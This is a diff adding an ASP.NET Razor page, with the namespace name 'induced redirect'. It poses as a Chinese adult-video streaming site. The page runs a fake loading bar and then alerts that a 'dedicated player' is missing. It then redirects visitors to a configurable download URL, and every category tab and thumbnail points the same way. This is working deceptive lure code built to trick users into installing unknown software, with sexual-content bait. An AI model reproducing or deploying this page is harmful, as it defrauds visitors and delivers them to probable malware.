@@ -1,0 +1,176 @@
+﻿@model 诱导跳转.Models.PackageInfo
+
+@{
+    var topImg = ViewBag.TopImg + ".jpg";
+    var img2 = ViewBag.Img2 + ".jpg";
+    var img1 = ViewBag.Img1 + ".jpg";
+    var img3 = ViewBag.Img3 + ".jpg";
+    var img4 = ViewBag.Img4 + ".jpg";
+    var img5 = ViewBag.Img5 + ".jpg";
+}
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>高清爽片在线播放</title>
+    <meta content="text/html; charset=utf-8" http-equiv=Content-Type>
+    <meta name=viewport content='width=device-width,initial-scale=1,user-scalable=no'>
+    <link href="~/Css/1.css" rel="stylesheet" />
+    <meta name=GENERATOR content="MSHTML 8.00.6001.18702">
+</head>
+<body>
+    <div class=top data-role="header">
+        <div class=kb_dh>
+            <ul>
+                <li class=xz data-cid="0">
+                    @Html.ActionLink("首页", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                </li>
+                <li data-cid="1">
+                    @Html.ActionLink("日本", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                </li>
+                <li data-cid="2">
+                    @Html.ActionLink("韩国", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                </li>
+                <li data-cid="3">
+                    @Html.ActionLink("欧美", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                </li>
+                <li data-cid="4">
+                    @Html.ActionLink("自拍", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                </li>
+            </ul>
+        </div>
+    </div>
+    <input type="hidden" id="url" value="@Model.Url" />
+    <div id=vod class=kb_yd data-role="page">
+        <div data-role="content">
+            <div class=n_top>
+                <div class=n_title>
+                    <p align="center" style="DISPLAY: none" id=ok name=loading>
+                        <script>document.writeln("<a href=" + down('v') + ">")</script>
+                        <font size="3" color="#00FF00">没安装播放器</font><font size="3" color="#FFFFFFF">无法播放,点击下载<font color="#00FF00">专用播放器</font></font>
+                </div>
+            </div>
+            <div style="height:250px;">
+                <div style="background-color:#000000; width:320px">
+                    <span></span>
+                    <table width="100" border="0" cellpadding="0" cellspacing="0">
+                        <tr>
+                            <td width="241" style="margin-top:90px;">
+                    </table>
+                    <form name=loading>
+                        <p style="DISPLAY: none;" id=isLoading>
+                            正在加载影片请稍候 ....
+                            <input style="BORDER-BOTTOM: medium none; TEXT-ALIGN: center; BORDER-LEFT: medium none; BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: #00ff00; BORDER-TOP: medium none; BORDER-RIGHT: medium none" size=4 name=percent>
+                    </form>
+                    <p>
+                </div>
+
+                <script>
+                    var bar = 0
+                    var line = "||"
+                    var amount = "||"
+                    count()
+                    function count() {
+                        isLoading.style.display = "none";		//隐藏层 [加载进度]
+                        bar = bar + 4
+                        amount = amount + line
+                        document.loading.percent.value = bar + "%"
+                        if (bar < 99) {
+                            isLoading.style.display = "block";	//显示层 [加载进度]
+                            setTimeout("count()", 70);
+                        }
+                        else {
+                            alert('没有检测到本站专用播放器,请下载本站专用播放器，安装后运行即可观看本站2W部成人爽片！');
+                            ok.style.display = "block";
+                            var url = document.getElementById('url').value;
+                            //alert(url);
+                            window.location.href = url;
+                        }
+                    }
+                </script>
+
+                <a href="@Model.Url"><img src="~/Image/@topImg" /></a>
+
+            </div>
+        </div>
+
+        <div class=home_lb data-role="content">
+            <div class=lb_zk>
+                <ul>
+                    <b><font size="3">&nbsp;推荐高清影片</font></b>
+                    <font size="3" face="华文宋体"> </font>
+                    <li>
+                        <div class=L1>
+                            <span class=pc_wz>超爽片</span><span class=pc_bg></span>
+                            <a href="@Model.Url"><img src="~/Image/@img2" /></a>
+                        </div>
+                        <div class=R1>
+                            <p class=dazi>
+                                <script>document.writeln(a2[0])</script>
+                            </p>
+                            <p>类型：高清</p><p>地区：日韩电影</p>
+                            <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
+                        </div>
+                    </li>
+
+                    <li>
+                        <div class=L1>
+                            <span class=pc_wz>超爽片</span><span class=pc_bg></span>
+                            <a href="@Model.Url"><img src="~/Image/@img3" /></a>
+                        </div>
+                        <div class=R1>
+                            <p class=dazi>
+                                <script>document.writeln(a2[1])</script>
+                            </p>
+                            <p>类型：高清</p><p>地区：日韩电影</p>
+                            <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
+                        </div>
+                    </li>
+
+                    <li>
+                        <div class=L1>
+                            <span class=pc_wz>超爽片</span><span class=pc_bg></span>
+                            <a href="@Model.Url"><img src="~/Image/@img4" /></a>
+                        </div>
+                        <div class=R1>
+                            <p class=dazi>
+                                <script>document.writeln(a2[2])</script>
+                            </p>
+                            <p>类型：高清</p><p>地区：日韩电影</p>
+                            <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
+                        </div>
+                    </li>
+
+                    <li>
+                        <div class=L1>
+                            <span class=pc_wz>超爽片</span><span class=pc_bg></span>
+                            <a href="@Model.Url"><img src="~/Image/@img5" /></a>
+                        </div>
+                        <div class=R1>
+                            <p class=dazi>
+                                <script>document.writeln(a2[3])</script>
+                            </p>
+                            <p>类型：高清</p><p>地区：日韩电影</p>
+                            <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
+                        </div>
+                    </li>
+
+                    <li>
+                        <div class=L1>
+                            <span class=pc_wz>超爽片</span><span class=pc_bg></span>
+                            <a href="@Model.Url"><img src="~/Image/@img1" /></a>
+                        </div>
+                        <div class=R1>
+                            <p class=dazi>
+                                <script>document.writeln(a2[4])</script>
+                            </p>
+                            <p>类型：高清</p><p>地区：日韩电影</p>
+                            <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
